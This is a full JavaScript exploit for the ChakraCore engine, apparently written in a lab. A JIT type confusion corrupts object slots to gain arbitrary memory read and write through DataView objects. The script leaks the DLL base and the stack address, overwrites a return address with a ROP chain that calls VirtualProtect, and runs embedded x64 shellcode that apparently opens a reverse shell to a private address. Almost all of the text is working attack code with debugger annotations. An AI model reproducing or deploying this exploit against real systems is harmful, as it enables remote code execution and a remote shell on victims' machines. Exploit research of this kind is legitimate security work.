// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

dataview1.setUint32(0x0, 0x43434343, true); 
dataview1.setUint32(0x4, 0x43434343, true); 
dataview1.setUint32(0x8, 0x43434343, true); 
dataview1.setUint32(0xc, 0x43434343, true); 
dataview1.setUint32(0x10, 0x43434343, true); 
dataview1.setUint32(0x14, 0x43434343, true); 
dataview1.setUint32(0x18, 0x43434343, true); 
dataview1.setUint32(0x1c, 0x43434343, true); 
dataview1.setUint32(0x20, 0x43434343, true); 
dataview1.setUint32(0x24, 0x43434343, true); 
dataview1.setUint32(0x28, 0x43434343, true); 
dataview1.setUint32(0x2c, 0x43434343, true); 
dataview1.setUint32(0x30, 0x43434343, true); 
dataview1.setUint32(0x34, 0x43434343, true); 
dataview1.setUint32(0x38, 0x43434343, true); 
dataview1.setUint32(0x3c, 0x43434343, true); 
dataview1.setUint32(0x40, 0x43434343, true); 
dataview1.setUint32(0x44, 0x43434343, true); 
dataview1.setUint32(0x48, 0x43434343, true); 
dataview1.setUint32(0x4c, 0x43434343, true); 

dataview2.setUint32(0x0, 0x44444444, true); 
dataview2.setUint32(0x4, 0x44444444, true); 
dataview2.setUint32(0x8, 0x44444444, true); 
dataview2.setUint32(0xc, 0x44444444, true); 

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function testWrites64() {
	dataview1.setUint32(0x0, 0x42424242, true); 	
	dataview1.setUint32(0x4, 0x42424242, true);    
	print("DEBUG - testWrites64");
	/*
0:004> dqs 00000186`1c70e000
00000186`1c70e000  00007ffa`0cd91e30 chakracore!Js::DataView::`vftable' (dataview1)
00000186`1c70e008  00000186`1c6e2040
00000186`1c70e010  00000000`00000000
00000186`1c70e018  00000000`00000000
00000186`1c70e020  00000000`00000100
00000186`1c70e028  00000186`1c6f00a0
00000186`1c70e030  00000000`00000000
00000186`1c70e038  00000186`1c70e040
00000186`1c70e040  42424242`42424242 (dataview2)
00000186`1c70e048  00000186`1c6e2040
00000186`1c70e050  00000000`00000000
00000186`1c70e058  00000000`00000000
00000186`1c70e060  00000000`00000100
00000186`1c70e068  00000186`1c6f00f0
00000186`1c70e070  00000000`00000000
00000186`1c70e078  00000186`1ad6d470 <- dataview1.setUint32 will write the address here
                                     <- dataview2.setUint32 will write to whereever the address is pointing to
0:004> dqs 00000186`1ad6d470
00000186`1ad6d470  44444444`44444444
00000186`1ad6d478  44444444`44444444
	*/
}

function hex(x) {
    x = x.toString(16);
    while (x.length < 8) x = "0"+x
    return x
}

function write64(addressLower64Bit, addressHigher64Bit, valueLower64Bit, valueHigher64Bit) {
	// 0x38/0x8 = 0x7
	// dataview1.setUint32(0x38...) is basically obj.h
	dataview1.setUint32(0x38, addressLower64Bit, true); 	// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
	dataview2.setUint32(0x0, valueLower64Bit, true);		// 4-byte arbitrary write
	dataview2.setUint32(0x4, valueHigher64Bit, true);		// 4-byte arbitrary write
}

function read64(addressLower64Bit, addressHigher64Bit) {
	// 0x38/0x8 = 0x7
	// dataview1.setUint32(0x38...) is basically obj.h
	dataview1.setUint32(0x38, addressLower64Bit, true); 	// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
	
	var read = new Uint32Array(0x10);
	read[0] = dataview2.getUint32(0x0, true);
	read[1] = dataview2.getUint32(0x4, true);
	return read
}

function main() {

    //vtableLo = dataview1.getUint32(0, true);
	//vtableHigh = dataview1.getUint32(4, true);
	//print("[+] DataView object 1 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    //vtableLo = dataview2.getUint32(0, true);
	//vtableHigh = dataview2.getUint32(4, true);
	//print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));

    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    print("DEBUG - hehe opt() is not marked as 'HOT'"); // ch!WScriptJsrt::EchoCallback
    let o = {a: 0x41414141, b: 0x42424242};             // chakracore!Js::DynamicTypeHandler::SetSlotUnchecked
                                                        // should hit twice   
    print("DEBUG - type confusion incoming...");        // ch!WScriptJsrt::EchoCallback
                                                        // ba w 8 first inline value
    opt(o, o, obj);		  
    print("DEBUG - o.a = obj (obj->vftable)!");         // ch!WScriptJsrt::EchoCallback
                                                        // first inline value should be a pointer to another vftable
    // O-ADDRESS:       o->vftable
    // O-TYPE:          o->type
    // O-INLINE-1:      obj->vftable (o.a)
    // o.a:             obj->vftable 
    // o.b:             obj->type
    // o.c:             obj->auxSlots[0]
    // o.d:             obj->auxSlots[0]+8
    // obj.a:           1
    // obj->auxSlots[0]:1 
    // obj.b:           2
    // obj->auxSlots[1]:2 
    // ...
    // all the above are "pointer to"s
    o.c = dataview1 
    //o.d = 0x42424242 // observe the impact here, will crash program though
    print("DEBUG - set obj->auxSlots to dataview1");       // ch!WScriptJsrt::EchoCallback
    // o.c:               dataview1->vftable
    // obj->auxSlots[0]:  dataview1->vftable
    // obj->auxSlots[7]:  dataview1->buffer
    // obj.h:             dataview1->buffer
    // o.d:               obj->auxSlots[0]+8
    // obj->auxSlots[0]+8:0x42424242
    obj.h = dataview2 // value here corrupted and will be leaked via dataview1
    // dataview1->buffer is set to pointer to dataview2
    print("DEBUG - set dataview1->buffer to dataview2 or whatever you want");

    leakLo = dataview1.getUint32(0, true);
	leakHi = dataview1.getUint32(4, true);
	print("[+] Pointer to DataView->buffer leaked: 0x" + hex(leakHi) + hex(leakLo));

    if (hex(leakHi) + hex(leakLo) === "4343434343434343") {
        print("[*] Exploit failed :(")
        return
    }

    //leakLo = dataview1.getUint32(8, true);
    //leakHi = dataview1.getUint32(0xc, true);
    //print("[+] Pointer to DataView->buffer+8 leaked: 0x" + hex(leakHi) + hex(leakLo));

    //leakLo = dataview1.getUint32(0x10, true);
    //leakHi = dataview1.getUint32(0x14, true);
    //print("[+] Pointer to DataView->buffer+0x10 leaked: 0x" + hex(leakHi) + hex(leakLo));

    //obj.h = new ArrayBuffer(0x10)
    /*
    0:004> dqs 0x00007ffe9b07ef78
    00007ffe`9b07ef78  00007ffe`9a2f2990 chakracore!Js::JavascriptArrayBuffer::Finalize [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\library\arraybuffer.cpp @ 891]
    00007ffe`9b07ef80  00007ffe`9a2f1720 chakracore!Js::JavascriptArrayBuffer::Dispose [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\library\arraybuffer.cpp @ 931]
    00007ffe`9b07ef88  00007ffe`9987b640 chakracore!FinalizableObject::Mark [c:\users\kali\desktop\chakracore\chakracore\lib\common\core\finalizableobject.h @ 14]
    00007ffe`9b07ef90  00007ffe`99882bc0 chakracore!FinalizableObject::OnMark [c:\users\kali\desktop\chakracore\chakracore\lib\common\core\finalizableobject.h @ 11]
    00007ffe`9b07ef98  00007ffe`9988ae50 chakracore!FinalizableObject::Trace [c:\users\kali\desktop\chakracore\chakracore\lib\common\core\finalizableobject.h @ 19]
    00007ffe`9b07efa0  00007ffe`9a61e500 chakracore!Js::DynamicObject::Mark [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamicobject.cpp @ 1070]
    00007ffe`9b07efa8  00007ffe`9a6196f0 chakracore!Js::RecyclableObject::GetPrototypeSpecial [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.cpp @ 168]
    00007ffe`9b07efb0  00007ffe`9a6221b0 chakracore!Js::DynamicObject::GetPropertyId [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 235]
    00007ffe`9b07efb8  00007ffe`9a622160 chakracore!Js::DynamicObject::GetPropertyId [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 230]
    00007ffe`9b07efc0  00007ffe`9a622200 chakracore!Js::DynamicObject::GetPropertyIndex [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 240]
    00007ffe`9b07efc8  00007ffe`9a6220a0 chakracore!Js::DynamicObject::GetPropertyCount [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 212]
    00007ffe`9b07efd0  00007ffe`9a622ad0 chakracore!Js::DynamicObject::HasPropertyQuery [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 247]
    00007ffe`9b07efd8  00007ffe`9a622a10 chakracore!Js::DynamicObject::HasOwnProperty [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\dynamictype.cpp @ 257]
    00007ffe`9b07efe0  00007ffe`9a619b60 chakracore!Js::RecyclableObject::HasOwnPropertyNoHostObject [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.cpp @ 357]
    00007ffe`9b07efe8  00007ffe`99878080 chakracore!Js::RecyclableObject::HasOwnPropertyCheckNoRedecl [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.h @ 297]
    00007ffe`9b07eff0  00007ffe`9988af10 chakracore!Js::RecyclableObject::UseDynamicObjectForNoHostObjectAccess [c:\users\kali\desktop\chakracore\chakracore\lib\runtime\types\recyclableobject.h @ 298]
    */
    var targetObject = new Object()
    
    obj.h = targetObject
    leakLo = dataview1.getUint32(0, true);
    leakHi = dataview1.getUint32(4, true);
    print("[+] Object() Vftable leaked: 0x" + hex(leakHi) + hex(leakLo));
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    obj.h = dataview2;

    vtableLo = dataview1.getUint32(0, true);
    vtableHigh = dataview1.getUint32(4, true);
    print("[+] DataView object 1 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    //vtableLo = dataview2.getUint32(0, true);
    //vtableHigh = dataview2.getUint32(4, true);
    //print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    chakraLo = dataview1.getUint32(0, true) - 0x019ce650;
    chakraHigh = dataview1.getUint32(4, true);
    print("[+] ChakraCore.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////
   
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);
    print("[+] DataView object 1 leaked type pointer from ChakraCore.dll: 0x" + hex(typeHigh) + hex(typeLo));

    javascriptLibrary = read64(typeLo+0x8, typeHigh);
    // Leak type->javascriptLibrary->scriptContext (located at javascriptLibrary+0x450)
    scriptContext = read64(javascriptLibrary[0]+0x450, javascriptLibrary[1]);
    // Leak type->javascripLibrary->scriptContext->threadContext
    threadContext = read64(scriptContext[0]+0x3b8, scriptContext[1]);
    // Leak type->javascriptLibrary->scriptContext->threadContext->stackLimitForCurrentThread (located at threadContext+0xc8)
    stackAddress = read64(threadContext[0]+0xc8, threadContext[1]);
    print("[+] Leaked stack from type->javascriptLibrary->scriptContext->threadContext->stackLimitForCurrentThread: 0x" + hex(stackAddress[1]) + hex(stackAddress[0]));

    var stackLeak = new Uint32Array(0x10);
    stackLeak[0] = stackAddress[0] + 0x000ec000 - 0x1000;
    stackLeak[1] = stackAddress[1];
    print("[+] Stack limit: 0x" + hex(stackLeak[1]) + hex(stackLeak[0]));

    var baseLeak = new Uint32Array(0x10);
    baseLeak[0] = stackAddress[0] + 0x000ec000 - 0x1000 + 0x9000 - 0x8;
    baseLeak[1] = stackAddress[1];
    print("[+] Stack base: 0x" + hex(baseLeak[1]) + hex(baseLeak[0]));

    heheCounter = 0

    // Loop
    for (let counter = 0; counter < 0x7f00; counter+=0x8) 
    {
        tempContents = read64(baseLeak[0]-counter, baseLeak[1]);
        if ((tempContents[0] >= stackLeak[0]) && (tempContents[1] === stackLeak[1]) && (tempContents[0] <= baseLeak[0]) && (heheCounter < 0x1)) {
            print("[+] A valid return address within a stack frame: 0x" + hex(baseLeak[1]) + hex(baseLeak[0]-counter) + " contains: 0x" + hex(tempContents[1]) + hex(tempContents[0]));
            // alternate rop chain and shellcode cause not enough space
            write64(tempContents[0], tempContents[1], 0x41414141, 0x41414141)
            write64(tempContents[0]+0x8, tempContents[1], 0x43434343, 0x43434343)
            write64(tempContents[0]+0x10, tempContents[1], 0x44444444, 0x44444444)
            write64(tempContents[0]+0x18, tempContents[1], 0x45454545, 0x45454545)
            write64(tempContents[0]+0x20, tempContents[1], 0x46464646, 0x46464646)
            write64(tempContents[0]+0x28, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x30, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x38, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x40, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x48, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x50, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x58, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x60, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x68, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            write64(tempContents[0]+0x70, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            //write64(tempContents[0]+0x78, tempContents[1], 0x41414141, 0x41414141) // from here, int3
            write64(tempContents[0]+0x78, tempContents[1], chakraLo+0x17a7f40,chakraHigh)
            //write64(tempContents[0]+0x78, tempContents[1], chakraLo+0x0077474b+4, chakraHigh) // from here, int3
            write64(tempContents[0]+0x80, tempContents[1], chakraLo+0x849c93,chakraHigh)    // 0x1800404ab: pop rcx ; ret  ;  (1 found)
            write64(tempContents[0]+0x88, tempContents[1], tempContents[0]+0x110+0x20, tempContents[1])
            write64(tempContents[0]+0x90, tempContents[1], chakraLo+0x16992,chakraHigh)     // 0x180004fda: pop rdx ; ret  ;  (1 found)
            write64(tempContents[0]+0x98, tempContents[1], 0x300,0x0)
            write64(tempContents[0]+0xa0, tempContents[1], chakraLo+0x152e1ac,chakraHigh) // 0x18152decc: pop r8 ; ret  ;  (1 found)
            write64(tempContents[0]+0xa8, tempContents[1], 0x40,0x0)
            write64(tempContents[0]+0xb0, tempContents[1], chakraLo+0x13a7db5,chakraHigh)    // pop r9 ; sar esi, 1  ; add rsp, 0x28 ; ret  ;  (1 found)
            write64(tempContents[0]+0xb8, tempContents[1], chakraLo+0x1d38a1c,chakraHigh)  // writeable pointer

            write64(tempContents[0]+0xc0, tempContents[1], 0xcdcdcdcd, 0xcdcdcdcd) // 0x8
            write64(tempContents[0]+0xc8, tempContents[1], 0xcdcdcdcd, 0xcdcdcdcd) // 0x10   
            write64(tempContents[0]+0xd0, tempContents[1], 0xcdcdcdcd, 0xcdcdcdcd) // 0x18    
            write64(tempContents[0]+0xd8, tempContents[1], 0xcdcdcdcd, 0xcdcdcdcd) // 0x20
            write64(tempContents[0]+0xe0, tempContents[1], 0xcdcdcdcd, 0xcdcdcdcd) // 0x28

            write64(tempContents[0]+0xe8, tempContents[1], chakraLo+0x349d8, chakraHigh);   // 0x180041e3c: pop rax ; ret  ;  (1 found)
            write64(tempContents[0]+0xf0, tempContents[1], chakraLo+0x17c0058-0x30, chakraHigh); // addressof(KERNEL32!VirtualProtectStub)
            write64(tempContents[0]+0xf8, tempContents[1], chakraLo+0x5806a, chakraHigh);   // 0x18005806a: mov rax, qword [rax+30] ; ret ; (1 found) 
            write64(tempContents[0]+0x100, tempContents[1], chakraLo+0x037e98d, chakraHigh);   // 0x180034ba0: push rax ; ret  ;  (1 found) (same as jmp rax)
            write64(tempContents[0]+0x108, tempContents[1], tempContents[0]+0x110+0x20, tempContents[1])
            write64(tempContents[0]+0x110, tempContents[1], 0x90909090, 0x90909090)   
            write64(tempContents[0]+0x118, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x120, tempContents[1], 0x90909090, 0x90909090)         
            write64(tempContents[0]+0x128, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x130, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x138, tempContents[1], 0x90909090, 0x90909090)         
            write64(tempContents[0]+0x140, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x148, tempContents[1], 0x90909090, 0x90909090)
            /*
            write64(tempContents[0]+0x150, tempContents[1], 0x90909090, 0x90909090)         
            write64(tempContents[0]+0x158, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x160, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x168, tempContents[1], 0x90909090, 0x90909090)         
            write64(tempContents[0]+0x170, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x178, tempContents[1], 0x90909090, 0x90909090)
            */
            write64(tempContents[0]+0x150, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x158, tempContents[1], 0xe48348fc, 0x00c0e8f0)
            write64(tempContents[0]+0x160, tempContents[1], 0x51410000, 0x51525041)
            write64(tempContents[0]+0x168, tempContents[1], 0xd2314856, 0x528b4865)
            write64(tempContents[0]+0x170, tempContents[1], 0x528b4860, 0x528b4818)
            write64(tempContents[0]+0x178, tempContents[1], 0x728b4820, 0xb70f4850)
            write64(tempContents[0]+0x180, tempContents[1], 0x314d4a4a, 0xc03148c9)
            write64(tempContents[0]+0x188, tempContents[1], 0x7c613cac, 0x41202c02)
            write64(tempContents[0]+0x190, tempContents[1], 0x410dc9c1, 0xede2c101)
            write64(tempContents[0]+0x198, tempContents[1], 0x48514152, 0x8b20528b)
            write64(tempContents[0]+0x1a0, tempContents[1], 0x01483c42, 0x88808bd0)
            write64(tempContents[0]+0x1a8, tempContents[1], 0x48000000, 0x6774c085)
            write64(tempContents[0]+0x1b0, tempContents[1], 0x50d00148, 0x4418488b)
            write64(tempContents[0]+0x1b8, tempContents[1], 0x4920408b, 0x56e3d001)
            write64(tempContents[0]+0x1c0, tempContents[1], 0x41c9ff48, 0x4888348b)
            write64(tempContents[0]+0x1c8, tempContents[1], 0x314dd601, 0xc03148c9)
            write64(tempContents[0]+0x1d0, tempContents[1], 0xc9c141ac, 0xc101410d)
            write64(tempContents[0]+0x1d8, tempContents[1], 0xf175e038, 0x244c034c)
            write64(tempContents[0]+0x1e0, tempContents[1], 0xd1394508, 0x4458d875)
            write64(tempContents[0]+0x1e8, tempContents[1], 0x4924408b, 0x4166d001)
            write64(tempContents[0]+0x1f0, tempContents[1], 0x44480c8b, 0x491c408b)
            write64(tempContents[0]+0x1f8, tempContents[1], 0x8b41d001, 0x01488804)
            write64(tempContents[0]+0x200, tempContents[1], 0x415841d0, 0x5a595e58)
            write64(tempContents[0]+0x208, tempContents[1], 0x59415841, 0x83485a41)
            write64(tempContents[0]+0x210, tempContents[1], 0x524120ec, 0x4158e0ff)
            write64(tempContents[0]+0x218, tempContents[1], 0x8b485a59, 0xff57e912)
            write64(tempContents[0]+0x220, tempContents[1], 0x495dffff, 0x327377be)
            write64(tempContents[0]+0x228, tempContents[1], 0x0032335f, 0x49564100)
            write64(tempContents[0]+0x230, tempContents[1], 0x8148e689, 0x0001a0ec)
            write64(tempContents[0]+0x238, tempContents[1], 0xe5894900, 0x0002bc49)
            write64(tempContents[0]+0x240, tempContents[1], 0xa8c0f604, 0x544180d5)
            write64(tempContents[0]+0x248, tempContents[1], 0x4ce48949, 0xba41f189)
            write64(tempContents[0]+0x250, tempContents[1], 0x0726774c, 0x894cd5ff)
            write64(tempContents[0]+0x258, tempContents[1], 0x010168ea, 0x41590000)
            write64(tempContents[0]+0x260, tempContents[1], 0x6b8029ba, 0x50d5ff00)
            write64(tempContents[0]+0x268, tempContents[1], 0xc9314d50, 0x48c0314d)
            write64(tempContents[0]+0x270, tempContents[1], 0x8948c0ff, 0xc0ff48c2)
            write64(tempContents[0]+0x278, tempContents[1], 0x41c18948, 0xdf0feaba)
            write64(tempContents[0]+0x280, tempContents[1], 0x48d5ffe0, 0x106ac789)
            write64(tempContents[0]+0x288, tempContents[1], 0x894c5841, 0xf98948e2)
            write64(tempContents[0]+0x290, tempContents[1], 0xa599ba41, 0xd5ff6174)
            write64(tempContents[0]+0x298, tempContents[1], 0x40c48148, 0x49000002)
            write64(tempContents[0]+0x2a0, tempContents[1], 0x646d63b8, 0x00000000)
            write64(tempContents[0]+0x2a8, tempContents[1], 0x41504100, 0xe2894850)
            write64(tempContents[0]+0x2b0, tempContents[1], 0x4d575757, 0x0d6ac031)
            write64(tempContents[0]+0x2b8, tempContents[1], 0xe2504159, 0x44c766fc)
            write64(tempContents[0]+0x2c0, tempContents[1], 0x01015424, 0x24448d48)
            write64(tempContents[0]+0x2c8, tempContents[1], 0x6800c618, 0x56e68948)
            write64(tempContents[0]+0x2d0, tempContents[1], 0x41504150, 0x49504150)
            write64(tempContents[0]+0x2d8, tempContents[1], 0x5041c0ff, 0x4dc8ff49)
            write64(tempContents[0]+0x2e0, tempContents[1], 0x894cc189, 0x79ba41c1)
            write64(tempContents[0]+0x2e8, tempContents[1], 0xff863fcc, 0xd23148d5)
            write64(tempContents[0]+0x2f0, tempContents[1], 0x8bcaff48, 0x08ba410e)
            write64(tempContents[0]+0x2f8, tempContents[1], 0xff601d87, 0xb5f0bbd5)
            write64(tempContents[0]+0x300, tempContents[1], 0xba4156a2, 0x9dbd95a6)
            write64(tempContents[0]+0x308, tempContents[1], 0x8348d5ff, 0x063c28c4)
            write64(tempContents[0]+0x310, tempContents[1], 0xfb800a7c, 0xbb0575e0)
            write64(tempContents[0]+0x318, tempContents[1], 0x6f721347, 0x4159006a)
            write64(tempContents[0]+0x320, tempContents[1], 0xd5ffda89, 0x90909090)
            write64(tempContents[0]+0x328, tempContents[1], 0x90909090, 0x90909090)
            write64(tempContents[0]+0x330, tempContents[1], 0x90909090, 0x90909090)

            heheCounter += 1
        }
    }
    print("DONE")

}

main();

// C:\Users\kali\Desktop\ChakraCore\ChakraCore\Build\VcBuild\bin\exploit-3.js
// ch!WScriptJsrt::EchoCallback
// dqs poi(poi(poi(poi(0x0000022453b92040+0x8)+450)+3b8)+c8)

